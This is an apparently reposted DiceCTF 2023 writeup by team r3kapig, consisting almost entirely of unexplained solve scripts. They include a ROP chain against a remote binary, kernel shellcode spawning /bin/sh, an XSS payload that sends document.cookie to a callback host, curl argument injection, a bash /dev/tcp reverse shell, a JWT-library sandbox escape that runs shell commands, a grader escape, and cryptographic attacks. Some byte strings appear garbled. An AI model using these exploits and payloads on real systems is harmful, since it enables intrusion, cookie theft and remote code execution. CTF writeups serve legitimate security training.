# DiceCTF 2023 Writeup by r3kapig

> 原文: https://www.ctfiot.com/96097.html
> ID: 96097


```
from pwn import *

#p = process('bop')
p = remote('mc.ax', 30284)

pay = b'a'*32 + p64(0x404120-0x8)
pay += p64(0x00000000004013d3+1) #ret
pay += p64(0x00000000004013d3) #pop_rdi
pay += p64(0x404090)
pay += p64(0x4010F0) #printf
pay += p64(0x00000000004013d3) #pop_rdi
pay += p64(0x404100) #bss
pay += p64(0x401100) #gets
pay += p64(0x401364) #leave_ret

p.sendline(pay)

libc_base = u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00')) - 0x1ec980
print(f'libc_base = {hex(libc_base)}')

pay = b'flag.txt'.ljust(32,b'x00')

pay += p64(0x00000000004013d3) #pop_rdi
pay += p64(0x0)
pay += p64(libc_base+0x000000000002601f) #pop_rsi
pay += p64(libc_base - 0x2898)
pay += p64(libc_base+0x0000000000142c92) #pop_rdx
pay += p64(0x8)
pay += p64(libc_base+0x10dfc0) #read

pay += p64(0x00000000004013d3) #pop_rdi
pay += p64(0x404100)
pay += p64(libc_base+0x000000000002601f) #pop_rsi
pay += p64(0x0)
pay += p64(libc_base+0x0000000000036174) #pop_rax
pay += p64(0x2) #open
pay += p64(libc_base+0x000000000007f1d2)
pay += p64(libc_base+0x25EE2) #syscall

pay += p64(0x0061616161616161) * 13

pay += p64(0x00000000004013d3) #pop_rdi
pay += p64(0x3)
pay += p64(libc_base+0x000000000002601f) #pop_rsi
pay += p64(0x404300)
pay += p64(libc_base+0x0000000000142c92) #pop_rdx
pay += p64(0x100)
pay += p64(libc_base+0x10dfc0) #read

pay += p64(0x00000000004013d3) #pop_rdi
pay += p64(0x1)
pay += p64(libc_base+0x000000000002601f) #pop_rsi
pay += p64(0x404300)
pay += p64(libc_base+0x0000000000142c92) #pop_rdx
pay += p64(0x100)
pay += p64(libc_base+0x10e060) #write

p.sendline(pay)

p.sendline(p64(0x0061616161616161))

p.interactive()
```



```
#[account(
    constraint = password.key().as_ref()[..4] == b"osec"[..]
)]
pub password: AccountInfo<'info>,
```



```
use anchor_lang::prelude::*;
use anchor_spl::token::Token;
declare_id!("osecio1111111111111111111111111111111111111");
#[program]
pub mod solve {
    use super::*;

    pub fn get_flag(ctx: Context<GetFlag>) -> Result<()> {
        let get_flag_acc = chall::cpi::accounts::GetFlag {
            flag:ctx.accounts.state.to_account_info(),
            password: ctx.accounts.password.to_account_info(),
            payer: ctx.accounts.payer.to_account_info(),
            system_program: ctx.accounts.system_program.to_account_info(),
            rent: ctx.accounts.rent.to_account_info(),
        };
        let cpi_deposit = CpiContext::new(ctx.accounts.chall.to_account_info(), get_flag_acc);
        chall::cpi::get_flag(cpi_deposit)?;
        Ok(())
    }
}
#[derive(Accounts)]
pub struct GetFlag<'info> {
    #[account(mut)]
    pub state: AccountInfo<'info>,
    pub password: AccountInfo<'info>,
    #[account(mut)]
    pub payer: Signer<'info>,
    pub system_program: Program<'info, System>,
    pub token_program: Program<'info, Token>,
    pub rent: Sysvar<'info, Rent>,
    pub chall: Program<'info, chall::program::Chall>
}
```



```
use chall::anchor_lang::{InstructionData, ToAccountMetas};
use chall::FLAG_SEED;
use solana_program::pubkey;
use solana_program::pubkey::Pubkey;
use std::net::TcpStream;
use std::{error::Error, fs, io::prelude::*, io::BufReader, str::FromStr};

fn get_line<R: Read>(reader: &mut BufReader<R>) -> Result<String, Box<dyn Error>> {
    let mut line = String::new();
    reader.read_line(&mut line)?;

    let ret = line
        .split(':')
        .nth(1)
        .ok_or("invalid input")?
        .trim()
        .to_string();

    Ok(ret)
}

fn main() -> Result<(), Box<dyn Error>> {
    let mut stream = TcpStream::connect("127.0.0.1:8080")?;
    let mut reader = BufReader::new(stream.try_clone().unwrap());
    let mut line = String::new();
    let so_data = fs::read("./solve/target/deploy/solve.so")?;
    reader.read_line(&mut line)?;
    writeln!(stream, "{}", solve::ID)?;
    reader.read_line(&mut line)?;
    writeln!(stream, "{}", so_data.len())?;
    stream.write_all(&so_data)?;
    let chall_id = chall::ID;
    let user = Pubkey::from_str(&get_line(&mut reader)?)?;
    let ix = solve::instruction::GetFlag {};
    let data = ix.data();
    let password = Pubkey::from_str("8W4K4D8y1y7nXqNAYc3CtBMWj1dFDJRxrSbqffLTSg8u")?;
    let state = Pubkey::find_program_address(&[FLAG_SEED], &chall_id).0;
    let ix_accounts = solve::accounts::GetFlag {
        state,
        password: password,
        payer: user,
        token_program: spl_token::ID,
        chall: chall_id,
        system_program: solana_program::system_program::ID,
        rent: solana_program::sysvar::rent::ID,
    };
    let metas = ix_accounts.to_account_metas(None);
    reader.read_line(&mut line)?;
    writeln!(stream, "{}", metas.len())?;
    for meta in metas {
        let mut meta_str = String::new();
        meta_str.push('m');
        if meta.is_writable {
            meta_str.push('w');
        }
        if meta.is_signer {
            meta_str.push('s');
        }
        meta_str.push(' ');
        meta_str.push_str(&meta.pubkey.to_string());

        writeln!(stream, "{}", meta_str)?;
        stream.flush()?;
    }
    reader.read_line(&mut line)?;
    writeln!(stream, "{}", data.len())?;
    stream.write_all(&data)?;
    stream.flush()?;
    line.clear();
    while reader.read_line(&mut line)? != 0 {
        print!("{}", line);
        line.clear();
    }
    Ok(())
}
```



```
state.x += amt;
state.y += amt;

state.x += state.fee * state.x / 100;
state.y += state.fee * state.y / 100;
```



```
use anchor_lang::prelude::*;

use anchor_spl::token::Token;
declare_id!("osecio1111111111111111111111111111111111111");

#[program]
pub mod solve {
    use super::*;

    pub fn get_flag(ctx: Context<GetFlag>) -> Result<()> {

        let auth_fee_accounts = chall::cpi::accounts::AuthFee{
            state: ctx.accounts.state.to_account_info(),
            payer: ctx.accounts.payer.to_account_info(),
            system_program: ctx.accounts.system_program.to_account_info(),
            rent: ctx.accounts.rent.to_account_info(),
        };
        let cpi_set_fee = CpiContext::new(ctx.accounts.chall.to_account_info(), auth_fee_accounts);
        chall::cpi::set_fee(cpi_set_fee, -100)?;

        // swap
        let swap_accounts = chall::cpi::accounts::Swap{
            state: ctx.accounts.state.to_account_info(),
            payer: ctx.accounts.payer.to_account_info(),
            system_program: ctx.accounts.system_program.to_account_info(),
            rent: ctx.accounts.rent.to_account_info(),
        };
        let cpi_swap = CpiContext::new(ctx.accounts.chall.to_account_info(), swap_accounts);
        chall::cpi::swap(cpi_swap, -1000000)?;

        Ok(())
    }
}
#[derive(Accounts)]
pub struct GetFlag<'info> {
    #[account(mut)]
    pub state: AccountInfo<'info>,
    #[account(mut)]
    pub payer: Signer<'info>,

    pub system_program: Program<'info, System>,
    pub token_program: Program<'info, Token>,
    pub rent: Sysvar<'info, Rent>,
    pub chall: Program<'info, chall::program::Chall>
}
```



```
#include "./exploit.h"

int global_fd;

void cmd1() { ioctl(global_fd, 0xBEEF, NULL); }

void cmd2() { ioctl(global_fd, 0xDEAD, NULL); }

int main() {
  global_fd = open("/dev/exploited-device", O_RDWR);
  if (global_fd < 0) {
    die("[!] Failed to open /dev/exploited-device");
  }
  unsigned char sc[] = "Hxb8/bin/shx00PHx89xe7H1xd2H1xf6j;Xx0fx05";

  char buf[0x100];
  memset(buf, 0x90, sizeof(buf));
  memcpy(buf, sc, sizeof(sc));
  write(global_fd, buf, sizeof(buf));

  cmd2();
  cmd1();

  return 0;
}
```



```
<?php
  if (isset($_GET["source"])) highlight_file(__FILE__) && die();

  $name = "world";
  if (isset($_GET["name"]) && is_string($_GET["name"]) && strlen($_GET["name"]) < 128) {
    $name = $_GET["name"];
  }

  $nonce = hash("crc32b", $name);
  header("Content-Security-Policy: default-src 'none'; script-src 'nonce-$nonce' 'unsafe-inline'; base-uri 'none';");
?>
<!DOCTYPE html>
<html>
  <head>
    <title>recursive-csp</title>
  </head>
  <body>
    <h1>Hello, <?php echo $name ?>!</h1>
    <h3>Enter your name:</h3>
    <form method="GET">
      <input type="text" placeholder="name" name="name" />
      <input type="submit" />
    </form>
    <!-- /?source -->
  </body>
</html>
```



```
import crc from "crc/crc32";

const target = "e8b7be43";
const script = `<script nonce="${target}">location.href='https://mycallback/'+document.cookie</script>`;

const printables =
  "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~ tnrx0bx0c";

for (const a of printables) {
  for (const b of printables) {
    for (const c of printables) {
      for (const d of printables) {
        for (const e of printables) {
          const result = script + a + b + c + d + e;
          const digest = crc(result).toString(16);
          if (digest === target) {
            console.log(result);
            process.exit(0);
          }
        }
      }
    }
  }
}
```



```
# DICE 1001
# Homework 3
#
# @author [full name]
# @student_id [student id]
#
# Collaborators:
# - [list collaborators here]
#
# Resources:
# - [list resources consulted]

def add(a, b):
    '''
    Return the sum of a and b.

    Parameters:
        a (int): The first number to add.
        b (int): The second number to add.

    Returns:
        int: The sum of a and b.
    '''

    ######## YOUR CODE ########

    raise NotImplementedError

    ###########################

def longest(words):
    ...

def common(a, b):
    ...

def favorite():
    ...

def factor(n):
    ...

def preimage(hash):
    ...

def magic():
    ...
```



```
{
    '__name__': '__main__', 
    '__doc__': None, 
    '__package__': None, 
    '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f8252a78bd0>, 
    '__spec__': None, 
    '__annotations__': {}, 
    '__builtins__': <module 'builtins' (built-in)>, 
    '__file__': '/app/run', 
    '__cached__': None, 
    'json': <module 'json' from '/usr/local/lib/python3.11/json/__init__.py'>, 
    'sys': <module 'sys' (built-in)>, 
    'TestCase': <class 'unittest.case.TestCase'>, 
    'TestLoader': <class 'unittest.loader.TestLoader'>, 
    'TextTestRunner': <class 'unittest.runner.TextTestRunner'>, 
    'SilentResult': <class 'util.SilentResult'>, 
    'SubmissionImporter': <class 'util.SubmissionImporter'>, 
    'suite': <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[None, 
        None, 
        <test_1_add.TestAdd testMethod=test_add_positive>]>, 
        <unittest.suite.TestSuite tests=[]>]>, 
        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, 
        <unittest.suite.TestSuite tests=[<test_2_longest.TestLongest testMethod=test_longest_empty>, 
        <test_2_longest.TestLongest testMethod=test_longest_multiple>, 
        <test_2_longest.TestLongest testMethod=test_longest_multiple_tie>, 
        <test_2_longest.TestLongest testMethod=test_longest_single>]>]>, 
        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, 
        <unittest.suite.TestSuite tests=[<test_3_common.TestCommon testMethod=test_common_consecutive>, 
        <test_3_common.TestCommon testMethod=test_common_empty>, 
        <test_3_common.TestCommon testMethod=test_common_many>, 
        <test_3_common.TestCommon testMethod=test_common_nonconsecutive>, 
        <test_3_common.TestCommon testMethod=test_common_single>]>]>, 
        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, 
        <unittest.suite.TestSuite tests=[<test_4_favorite.TestFavorite testMethod=test_favorite>]>]>, 
        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, 
        <unittest.suite.TestSuite tests=[<test_5_factor.TestFactor testMethod=test_factor_bigger>, 
        <test_5_factor.TestFactor testMethod=test_factor_large>, 
        <test_5_factor.TestFactor testMethod=test_factor_small>]>]>, 
        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, 
        <unittest.suite.TestSuite tests=[<test_6_preimage.TestPreimage testMethod=test_preimage_a>, 
        <test_6_preimage.TestPreimage testMethod=test_preimage_b>]>]>, 
        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, 
        <unittest.suite.TestSuite tests=[<test_7_magic.TestMagic testMethod=test_magic_a>, 
        <test_7_magic.TestMagic testMethod=test_magic_b>, 
        <test_7_magic.TestMagic testMethod=test_magic_c>]>]>, 
        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[<test_8_hidden.TestHidden testMethod=test_hidden>]>]>]>, 
    'tests': [
        'test_hidden', 
        'test_magic_a', 
        'test_magic_b', 
        'test_magic_c', 
        'test_preimage_a', 
        'test_preimage_b', 
        'test_factor_bigger', 
        'test_factor_large', 
        'test_factor_small', 
        'test_favorite', 
        'test_common_consecutive', 
        'test_common_empty', 
        'test_common_many', 
        'test_common_nonconsecutive', 
        'test_common_single', 
        'test_longest_empty', 
        'test_longest_multiple', 
        'test_longest_multiple_tie', 
        'test_longest_single', 
        'test_add_mixed', 
        'test_add_negative', 
        'test_add_positive'
    ], 
    'stack': [], 
    'current': <unittest.suite.TestSuite tests=[
        None, 
        None, 
        <test_1_add.TestAdd testMethod=test_add_positive>
    ]>, 
    'test': <test_1_add.TestAdd testMethod=test_add_positive>, 
    'submission': 'import __main__rnrndef add(a, b):rn    raise BaseException(vars(__main__))', 
    'f': <_io.TextIOWrapper name='/dev/null' mode='w' encoding='utf-8'>, 
    'stdout': <_io.TextIOWrapper name='<stdout>' mode='w' encoding='utf-8'>, 
    'stderr': <_io.TextIOWrapper name='<stderr>' mode='w' encoding='utf-8'>
}
```



```
const csp = [
        "default-src 'none'",
        "style-src 'unsafe-inline'",
        "script-src 'unsafe-inline'",
    ];

    if (images.length) {
        csp.push(`img-src ${images.join(' ')}`);
    }

    res.header('Content-Security-Policy', csp.join('; '));
```



```
<script>
    const code = new URL(window.location.href).searchParams.get('code');
    if (code) {
        const frame = document.createElement('iframe');
        frame.srcdoc = code;
        frame.sandbox = '';
        frame.width = '100%';
        document.getElementById('content').appendChild(frame);
        document.getElementById('code').value = code; 
    }

    const flag = localStorage.getItem('flag') ?? "flag{test_flag}";
    document.getElementById('flag').innerHTML = `<h1>${flag}</h1>`;
</script>
```



```
https://codebox.mc.ax/?code=<img+src="111%3brequire-trusted-types-for+'script'%3breport-uri+http://csp.example.com%3b">
```



```
const code = new URL(window.location.href).searchParams.get('code');
```



```
app.post("/api/login", async (req, res) => { //...
app.post("/api/ping", requiresLogin, (req, res) => { // ..
```



```
const requiresLogin = (req, res, next) => {
    if (!req.session.user) {
        res.redirect("/?error=You need to be logged in");
    }
    next();
};
```



```
const args = [ url ];
    let { opt, data } = req.body;
    if (opt && data && typeof opt === "string" && typeof data === "string") {
        if (!/^-[A-Za-z]$/.test(opt)) {
            return res.json({ success: false, message: "Invalid option" });
        }

        // if -d option or if GET / POST switch
        if (opt === "-d" || ["GET", "POST"].includes(data)) {
            args.push(opt, data);
        }
    }

    cp.spawn('curl', args, { timeout: 2000, cwd: "/tmp" }).on('close', (code) => {
        // TODO: save result to database
        res.json({ success: true, message: `The site is ${code === 0 ? 'up' : 'down'}` });
    });
```



```
curl http(s)://<任意URL> -d <任何内容>
curl http(s)://<任意URL> -<一个字母> <GET或者POST>
```



```
create-dirs
output="/home/user/.node_modules/kerberos.js"
```



```
require('child_process').exec('bash -c "bash -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1"')
```



```
const { MongoClient } = require("mongodb");
const cp = require('child_process');
const express = require("express");
```



```
WORKDIR /app
COPY package.json ./
COPY static ./static
RUN npm i
COPY app.js .

RUN useradd -ms /bin/bash user
USER user

CMD ["/bin/sh", "-c", "while true; do node app.js; done"]
```



```
node -e '(async _ =>{const { MongoClient } = require("mongodb"); const client = new MongoClient("mongodb://mongodb:27017/"); q = await client.db("secret").collection("flag").find().toArray(); console.log(q);})()'
```



```
(() => {
  const c = (name, tar = {}) => new Proxy(
    tar,
    {
      apply: (...args) => {
        console.log(args)
      },
      get: (...args) => {
        console.log(args)
        if(args[1] === Symbol.toPrimitive) {
          return c(name + '.' + String(args[1]), () => {
            throw new Error()
          });
        }
        return c(name + '.' + String(args[1]));
      }
    }
  );
  return c('a', {});
})()
```



```
const endpoint = `https://jwtjail-fcf2ebccc5f50f79.mc.ax`
const jwt = require('jsonwebtoken')
// const endpoint = `http://localhost:12345`

const token = jwt.sign({}, 'a')

fetch(endpoint + `/api/verify`, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: new URLSearchParams({
    token: `'${token}'`,
    secretOrPrivateKey: `
(() => {
  const c = (name, tar = {}) => new Proxy(
    tar,
    {
      apply: (...args) => {
        try {
          const process = args[2].constructor.constructor.constructor('return process')()
          const flag = process
            .binding('spawn_sync')
            .spawn({
              maxBuffer: 1048576,
              shell: true,
              args: [ '/bin/sh', '-c', "/readflag" ],
              cwd: undefined,
              detached: false,
              envPairs: ['PWD=/'],
              file: '/bin/sh',
              windowsHide: false,
              windowsVerbatimArguments: false,
              killSignal: undefined,
              stdio: [
                { type: 'pipe', readable: true, writable: false },
                { type: 'pipe', readable: false, writable: true },
                { type: 'pipe', readable: false, writable: true }
              ]
            }).output[1].toString().trim()
          console.log(flag)
          process.__proto__.__proto__.__proto__.constructor.prototype.toJSON =
            () => flag
        } catch (e) {
          console.log(e.stack)
        }
      },
      get: (...args) => {
        if(args[1] === Symbol.toPrimitive) {
          return c(name + '.' + String(args[1]), () => {
            throw new Error()
          });
        }
        return c(name + '.' + String(args[1]));
      }
    }
  );
  return c('a', {});
})()`
  })
})
  .then((res) => res.text())
  .then(console.log)
```



```
...
def encrypt(pk0, pk1, msg):
    r = urandom(16)
    r_prime = strxor(r, msg)
    ct0 = pk0.encrypt(r, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                         algorithm=hashes.SHA256(), label=None))
    ct1 = pk1.encrypt(r_prime, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), 
                         algorithm=hashes.SHA256(), label=None))
    return ct0.hex() + ct1.hex()
...encrypt:
                ct = encrypt(pk0, pk1, msg)
                seen_ct.add(ct)
...decrypt:
                in_ct = bytes.fromhex(input("ct (512 byte hexstring): ").strip())
                if len(in_ct) != 512:
                    print("Must be 512 bytes!")
                    exit(0)
                if in_ct in seen_ct:
                    print("Cannot query decryption on seen ciphertext!")
                    exit(0)
                print(decrypt(key0, key1, in_ct).hex())
...
```



```
from pwn import *
import os
from Crypto.Util.strxor import strxor
from tqdm import trange

def enc(io,m0,m1):
    io.recvuntil(b'Action: ')
    io.sendline(b'1')
    io.recvuntil(b'm0 (16 byte hexstring):')
    io.sendline(m0.hex().rjust(32).encode())
    io.recvuntil(b'm1 (16 byte hexstring):')
    io.sendline(m1.hex().rjust(32).encode())
    ret = io.recvline().strip()
    c1 = bytes.fromhex(ret[:512].decode())
    c2 = bytes.fromhex(ret[512:].decode())
    return c1,c2

def dec(io,c1,c2):
    io.recvuntil(b'Action: ')
    io.sendline(b'2')
    io.recvuntil(b'ct (512 byte hexstring):')
    io.sendline((c1+c2).hex().rjust(1024).encode())
    ret = io.recvline().strip()
    print(ret)
    return bytes.fromhex(ret.decode())

def guess(io,m0,m1,c_dec):
    io.recvuntil(b'Action: ')
    io.sendline(b'0')
    io.recvuntil(b'm_bit guess:')
    if c_dec == m0:
        io.sendline(b'0')
    elif c_dec == m1:
        io.sendline(b'1')
    print(io.recvline())

def exp(io):
    io.recvuntil(b'pk0 = ')
    n0 = int(io.recvline().strip())
    io.recvuntil(b'pk1 = ')
    n1 = int(io.recvline().strip())
    m0 = os.urandom(16)
    m1 = os.urandom(16)
    c0,c1 = enc(io,m0,m1)
    c_dec = dec(io,c0,c1)
    guess(io,m0,m1,c_dec)

io = remote("mc.ax",31493)
for _ in trange(128):
    exp(io)
io.interactive()
```



```
p,b = 
PR.<a> = PolynomialRing(GF(p))
rng = lambda x: (a*x + b)
f = rng(rng(rng(11))) - 11

a1 = f.roots()[0][0]
```



```
from Crypto.Util.number import *
R = [ , , ]
C = [ , , ]
N = [ , , ]
e=11
equation = []
nl = N
P.<x>=PolynomialRing(ZZ)
for _ in range(len(R)):
    f = (x*2**(128) + R[_]) ^ e - C[_]
    equation.append(f)
mod=1
for i in nl:
    mod*=i
ff=crt(equation,nl)
Q.<x>=PolynomialRing(Zmod(mod))
ff=Q(ff)
ff=ff.monic()

print(ff.small_roots(X=2 ** (8 * (53) ) , epsilon=0.03))
```



```
from pwn import * 
from Crypto.Util.number import *
import random
import gmpy2
def enc(io,m):
    io.recvuntil(b'Enter your option (EDF) >')
    io.sendline(b'E')
    io.recvuntil(b'Enter your integer to encrypt >')
    io.sendline(str(m).encode())
    c = int(io.recvline().strip())
    # print(c)
    return c
def dec(io,c):
    io.recvuntil(b'Enter your option (EDF) >')
    io.sendline(b'D')
    io.recvuntil(b'Enter your integer to decrypt >')
    io.sendline(str(c).encode())
    ret = int(io.recvline().strip())
    # print(ret)
    return ret

while 1:
    io = remote("mc.ax", 31370)

    m = random.randrange(0,2**155)

    m2 = m**2
    m3 = m2 ** 2
    c1 = enc(io,m)
    c2 = enc(io,m2)
    c3 = enc(io,m3)
    N = GCD(GCD(c1**2-c2,c2**2-c3),c1**4-c3)
    # print(N)

    tmpn = gmpy2.iroot(N,2)[0] - 1000
    
    c = enc(io,tmpn)
    ret = dec(io,c)
    print(ret)
    if ret == tmpn:
        io.close()

        continue
    else:
        print(tmpn)
        print(ret)
        io.interactive()
```



```
import time
from Crypto.Util.number import *
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
N = 80545740350366696040786599096389633376459388080405575580382175660942931663332287259816708558404888171625893708300948723190479843497481675855026518510172734186173283020307930155237393803233943128148948080353347867114710716892211203994136642581575859259982918065044314498000502057955265527285161355075190715183
m = 8974727870546643824894480038707533893278804499879297012515661522158486663107155507819765224149386590148491369613973070200195136368831070088919877094607659      
tmp = 80296603952031207669379394158997610974521100140196930414869684853979258240413843971984784637976573229402081902976836133573481895890773854234442286335635368924479529145071933526879987717959481322524583453167331713734664028421841638802807308225132771704457781451899179116092962676639117772413226298157456795074
c = 78039359365505830647863120097048278336840870881044130853869085319746050397290701173568458387165336669015392542436720204471746699941342744320642504097261279786910084930105137187694980137555480280357169445825986853526650060940129246485308585373751953485082957347620734091036672512753659098246781542640682747549
q = (GCD(tmp-m,N))
p = N // q
```



```
...
    def unpad(self, ct_int):
        """Decrypt a message with PKCS#1 OAEP.

        :param ciphertext: The encrypted message.
        :type ciphertext: bytes/bytearray/memoryview

        :returns: The original message (plaintext).
        :rtype: bytes

        :raises ValueError:
            if the ciphertext has the wrong length, or if decryption
            fails the integrity check (in which case, the decryption
            key is probably wrong).
        :raises TypeError:
            if the RSA key has no private half (i.e. you are trying
            to decrypt using a public key).
        """

        # See 7.1.2 in RFC3447
        modBits = Crypto.Util.number.size(self._key.n)
        k = ceil_div(modBits,8) # Convert from bits to bytes
        hLen = self._hashObj.digest_size
 
        m_int = ct_int
        # Complete step 2c (I2OSP)
        em = long_to_bytes(m_int, k)
        # Step 3a
        lHash = self._hashObj.new(self._label).digest()
        # Step 3b
        y = em[0]
        # y must be 0, but we MUST NOT check it here in order not to
        # allow attacks like Manger's (http://dl.acm.org/citation.cfm?id=704143)
        maskedSeed = em[1:hLen+1]
        maskedDB = em[hLen+1:]
        # Step 3c
        seedMask = self._mgf(maskedDB, hLen)
        # Step 3d
        seed = strxor(maskedSeed, seedMask)
        # Step 3e
        dbMask = self._mgf(seed, k-hLen-1)
        # Step 3f
        db = strxor(maskedDB, dbMask)
        # Step 3g
        one_pos = hLen + db[hLen:].find(b'x01')
        lHash1 = db[:hLen]
        invalid = bord(y) | int(one_pos < hLen)
        hash_compare = strxor(lHash1, lHash)
        for x in hash_compare:
            invalid |= bord(x)
        for x in db[hLen:one_pos]:
            invalid |= bord(x)
        if invalid != 0:
            raise ValueError("Incorrect decryption.")
        # Step 4
        return db[one_pos + 1:]
```



```
key = RSA.construct((q*p, e))
cipher = PKCS1_OAEP.new(key)  

def rthroot(c, r, q):
    c %= q
    assert(isPrime(r) and (q - 1) % r == 0 and (q - 1) % (r**2) != 0)
    l = ((q - 1) % (r**2)) // r
    alpha = (-inverse(l, r)) % r
    root = pow(c, ((1 + alpha * (q - 1) // r) // r), q)
    return root

def allroot(r, q, root):
    all_root = set()
    all_root.add(root)
    while len(all_root) < r:
        new_root = root
        unity = pow(getRandomRange(2, q), (q - 1) // r, q)
        for i in range(r - 1):
            new_root = (new_root * unity) % q
            all_root.add(new_root)
    return all_root

def decrypt(proot, qroot, p, q):
    count = 0
    total = len(proot) * len(qroot)
    t1 = inverse(q, p)
    t2 = inverse(p, q)
    for i in proot:
        for j in qroot:
            count += 1
            m = (i * t1 * q + j * t2 * p) % (p * q)
            
            assert (pow(m,e,N) == c)
            try:
                print( cipher.unpad((m)))
            except:
                continue

def main():
    print('[+] Calculating e-th root...')
    start = time.time()
    proot = rthroot(c, e, p)
    qroot = pow(c,inverse(e,q-1),q)
    end = time.time()
    print('[*] Cost {}s'.format(end - start))
    print('[+] Calculating all e-th roots...')
    start = time.time()
    all_proot = allroot(e, p, proot)
    all_qroot = [qroot]# 3 allroot(e, q, qroot)
    end = time.time()
    print('[*] Cost {}s'.format(end - start))
    print('[+] CRT cracking...')
    start = time.time()
    decrypt(all_proot, all_qroot, p, q)
    end = time.time()
    print('[*] Cost {}s'.format(end - start))

if __name__ == '__main__':
    main()
```



```
from sage.all import *
import numpy as np
from time import time
n = 512
# number of public key samples
m = n + 100
# plaintext modulus
p = 257
# ciphertext modulus
q = 1048583

data = np.load(r'data.npz')
pk_A=Matrix(GF(q),data['pk_A'].tolist())
pk_b=vector(GF(q),data['pk_b'].tolist())
encrypt_A=data['encrypt_A'].tolist()
encrypt_b=data['encrypt_b'].tolist()

def pk_Aexpress(pk_A):
    pkA_1 = pk_A[:512,:]
    pkA_2 = pk_A[512:,:]
    ks = []
    for row in pkA_2:
        ks.append(pkA_1.solve_left(row))
    return Matrix(ZZ,ks)

def fuck(A,pk_A):
    c_tmp = pk_A.solve_left(A)[:-100]
    print("nstart to express")
    tmpks = pk_Aexpress(pk_A)
    ks = tmpks[:,:100]
    print(" express done ")
    ks = ks.stack(Matrix(ZZ,[c_tmp[:100]]))
    M = Matrix(ZZ,100 + 100 + 1,100 + 100 + 1)
    M[:101,:101] = identity_matrix(101)  
    M[:101,101:] = ks
    M[101:,101:] = q * identity_matrix(100)
    start_time = time()
    print("start to LLL")
    ML = M.LLL()
    rows = ML[0]
    print(f"LLL done at {time()-start_time}")
    c_new = [0 for i in range(612)]
    c_list = Matrix(ZZ,Matrix(GF(q),rows[:100]*tmpks) + Integer(rows[100]) * Matrix(GF(q),c_tmp))[0]
    for _ in range(512):
        if c_list[_] == q-1:
            c_new[_] = -1
        else:
            c_new[_] = int(c_list[_])
    for _ in range(100):
        if rows[_] == q-1:
            c_new[_+512] = -1
        else:
            c_new[_+512] = int(rows[_])

    return c_new

flag_bytes = []
from tqdm import trange
for _ in trange(5,len(encrypt_A)-1):
    A = vector(GF(q),encrypt_A[_])
    b = encrypt_b[_]
    c_new = fuck(A,pk_A)

    c_first = c_new[:512]
    c_secon = c_new[512:]

    c = vector(ZZ, c_first+c_secon)
    if c*pk_A != A:
        c_first = [-i for i in c_first]
        c = vector(ZZ, c_first+c_secon)

    if c*pk_A != A:
        c_first = [-i for i in c_first]
        c_secon = [-i for i in c_secon]
        c = vector(ZZ, c_first+c_secon)

    if c*pk_A != A:
        c_first = [-i for i in c_first]
        c = vector(ZZ, c_first+c_secon)

    print(c*pk_A == A)

    msg = int(b - c * pk_b )
    if msg > q//2:
        msg -= q
    m = ZZ(msg % p)
    flag_bytes.append(int(m))
    print(_,flag_bytes)

a = [112, 117, 98, 108, 105] + [99, 45, 107, 101, 121] + [45, 108, 101, 97, 114] + [110, 105, 110, 103, 45] + [119, 105, 116, 104, 45] + [101, 97, 115, 101, 95] + [98,100,50,102,102] + [97,99,48,53,57,50,101]
```



```
def keygen():
    priv = ctypes.create_string_buffer(PRIVATE_KEY_SIZE)
    pub = ctypes.create_string_buffer(PUBLIC_KEY_SIZE)
    libcsidh.csidh_private(priv)
    libcsidh.csidh(pub, libcsidh.base, priv)
    return priv, pub

def apply_iso(start, iso):
    end = ctypes.create_string_buffer(PUBLIC_KEY_SIZE)
    libcsidh.csidh(end, start, iso)
    return end

class Alice:
    ...
    def encrypt(self, mask):
        ss0 = apply_iso(mask, invert(self.priv0))
        ss1 = apply_iso(mask, invert(self.priv1))
        enc0 = stream(self.msg0, ss0)
        enc1 = stream(self.msg1, ss1)
        return enc0, enc1
        
mask = ctypes.create_string_buffer(bytes.fromhex(mask_hex), PUBLIC_KEY_SIZE)
enc0, enc1 = alice.encrypt(mask)
```



```
#!/usr/bin/env python3

import ctypes
from Crypto.Util.number import *
from Crypto.Util.strxor import strxor
from Crypto.Hash import SHAKE128
from pwn import *

PRIVATE_KEY_SIZE = 74
PUBLIC_KEY_SIZE = 64
libcsidh = ctypes.CDLL('./libcsidh.so')

def pub2int(pub):
    return bytes_to_long(bytes(pub)[::-1])

def int2pub(x):
    return ctypes.create_string_buffer(long_to_bytes(x)[::-1].rjust(64, b'x00'), PUBLIC_KEY_SIZE)

def stream(buf, ss):
    pad = SHAKE128.new(bytes(ss)).read(len(buf))
    return strxor(buf, pad)

p = 5326738796327623094747867617954605554069371494832722337612446642054009560026576537626892113026381253624626941643949444792662881241621373288942880288065659

host, port = 'mc.ax 31336'.split(' ')
io = remote(host, int(port))
io.recvuntil(b'pub0: ')
pub0 = ctypes.create_string_buffer(bytes.fromhex(io.recvline().strip().decode()), PUBLIC_KEY_SIZE)
io.recvuntil(b'pub1: ')
pub1 = ctypes.create_string_buffer(bytes.fromhex(io.recvline().strip().decode()), PUBLIC_KEY_SIZE)
io.sendlineafter(b'mask: ', b'00' * 64)

ss0 = int2pub(-pub2int(pub0) % p)
ss1 = int2pub(-pub2int(pub1) % p)
io.recvuntil(b'enc0: ')
enc0 = bytes.fromhex(io.recvline().strip().decode())
io.recvuntil(b'enc1: ')
enc1 = bytes.fromhex(io.recvline().strip().decode())

msg0 = stream(enc0, ss0)
msg1 = stream(enc1, ss1)
flag = strxor(msg0, msg1)
